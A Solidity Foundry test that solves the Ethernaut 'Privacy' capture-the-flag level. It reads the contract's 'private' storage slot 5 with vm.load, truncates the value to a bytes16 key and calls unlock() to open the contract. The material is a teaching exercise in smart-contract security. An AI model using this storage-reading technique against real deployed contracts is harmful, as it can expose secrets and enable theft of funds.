// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Privacy.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

contract PrivacyExploit is Test {
  Privacy target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    bytes32[3] memory data = [
      bytes32('0x0a'),
      bytes32('0x0b'),
      bytes32('0x0c')
    ];
    target = new Privacy(data);
    console.log('Target contract deployed');
    vm.stopPrank();
  }

  function readBytes32FromTargetStorage(
    uint256 _slot
  ) public view returns (bytes32) {
    return vm.load(address(target), bytes32(_slot));
  }

  function testExploit() public {
    assertTrue(target.locked());
    console.log('Contract locked');

    // Storage layout
    // - slot 0: bool locked
    // - slot 1: uint256 ID
    // - slot 2: uint8 flattening + uint8 denomination + uint16 awkwardness
    // - slot 3: bytes32 data[0]
    // - slot 4: bytes32 data[1]
    // - slot 5: bytes32 data[2]
    console.log('Read key from storage');
    bytes32 slot5 = readBytes32FromTargetStorage(5);

    bytes16 key = bytes16(slot5);
    target.unlock(key);
    assertFalse(target.locked());
    console.log('Contract unlocked');
  }
}
